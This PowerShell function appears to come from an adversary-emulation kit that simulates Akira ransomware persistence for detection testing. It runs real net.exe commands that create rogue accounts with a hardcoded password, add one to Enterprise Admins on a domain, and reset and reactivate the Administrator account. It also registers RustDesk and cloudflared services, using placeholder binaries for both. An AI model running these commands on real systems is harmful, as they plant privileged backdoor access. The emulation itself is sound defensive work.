# ============================================================================
# AKIRA SIMULATION - PHASE 3: PERSISTENCE
# ============================================================================
# Simulates: rogue domain/local account creation with Enterprise Admin
# privileges, RustDesk installed as a service, Cloudflare tunnel service
# ("1.ps1", Swisscom variant), Administrator account reactivation.
# MITRE: T1136 Create Account, T1543.003 Windows Service, T1078 Valid Accounts
# ============================================================================

function Simulate-Persistence {
    param($SimPaths)

    Write-Host "[+] Phase 3: Persistence ..." -ForegroundColor Green

    $isDomain = Test-DomainJoined
    $domFlag = if ($isDomain) { "/add /dom" } else { "/add" }

    # --- Rogue account creation: backup_DA / backup_EA ---
    try {
        cmd.exe /c "net user backup_DA P@ssw0rd1234 $domFlag" | Out-Null
        cmd.exe /c "net user backup_EA P@ssw0rd1234 $domFlag" | Out-Null
        Write-SimEvent -EventId 3001 -Message "SIMULATION: Rogue accounts backup_DA / backup_EA created via net.exe"
    } catch { Write-Warning "Account creation failed: $_" }

    # --- Privilege escalation: add backup_EA to Enterprise Admins (domain) or local Administrators (standalone) ---
    try {
        if ($isDomain) {
            cmd.exe /c 'net group "enterprise admins" backup_EA /add /dom' | Out-Null
        } else {
            cmd.exe /c 'net localgroup Administrators backup_EA /add' | Out-Null
        }
        Write-SimEvent -EventId 3002 -Message "SIMULATION: backup_EA added to Enterprise Admins / local Administrators"
    } catch { Write-Warning "Group escalation failed: $_" }

    # --- Administrator account manipulation, matching report's day-2 activity ---
    try {
        cmd.exe /c "net user administrator P@ssw0rd!" 2>&1 | Out-Null
        cmd.exe /c "net user administrator /active:yes" 2>&1 | Out-Null
        Write-SimEvent -EventId 3003 -Message "SIMULATION: Local Administrator account password reset and reactivated"
    } catch {}

    # --- RustDesk installed as a Windows service (placeholder binary, real service registration) ---
    $rustDeskDir = "$env:ProgramFiles\RustDesk"
    New-Item -Path $rustDeskDir -ItemType Directory -Force | Out-Null
    $rustDeskExe = "$rustDeskDir\RustDesk.exe"
    # Placeholder binary standing in for the real RustDesk remote-access tool
    # (report shows the threat actor deploying genuine RustDesk; substitute the
    # real installer here for maximum fidelity if your lab has internet egress).
    Copy-Item -Path "$env:SystemRoot\System32\notepad.exe" -Destination $rustDeskExe -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $rustDeskExe)) { New-DecoyBinary -Path $rustDeskExe -SizeBytes 8388608 | Out-Null }

    try {
        New-Service -Name "RustDesk" -BinaryPathName "`"$rustDeskExe`" --service" -DisplayName "RustDesk Service" -StartupType Automatic -ErrorAction Stop | Out-Null
        Start-Process -FilePath $rustDeskExe -ArgumentList "--tray" -WindowStyle Hidden -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 3004 -Message "SIMULATION: RustDesk installed and registered as a Windows service for persistent remote access"
    } catch { Write-Warning "RustDesk service registration failed: $_" }

    # --- Cloudflare tunnel persistence (Swisscom variant: 1.ps1 downloads + registers cloudflared) ---
    $cfDir = "$($SimPaths.Staging)\cloudflared"
    New-Item -Path $cfDir -ItemType Directory -Force | Out-Null
    $cloudflaredExe = "$cfDir\cloudflared.exe"
    New-DecoyBinary -Path $cloudflaredExe -SizeBytes 15728640 | Out-Null

    $oneScript = @"
# 1.ps1 - AI-generated-looking installer script observed in the Swisscom intrusion
# Downloads cloudflared and registers it as a service for persistent reverse tunneling.
`$cfPath = "$cloudflaredExe"
# Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile `$cfPath
& `$cfPath service install
Write-Host "Cloudflare tunnel service installed."
"@
    Set-Content -Path "$cfDir\1.ps1" -Value $oneScript -Force

    try {
        New-Service -Name "Cloudflared" -BinaryPathName "`"$cloudflaredExe`" tunnel run" -DisplayName "Cloudflare Tunnel" -StartupType Automatic -ErrorAction Stop | Out-Null
        Write-SimEvent -EventId 3005 -Message "SIMULATION: cloudflared installed as a Windows service via 1.ps1 (Swisscom-variant persistence)"
    } catch { Write-Warning "cloudflared service registration failed: $_" }

    Write-Host "  [OK] Persistence artifacts created" -ForegroundColor Yellow
}
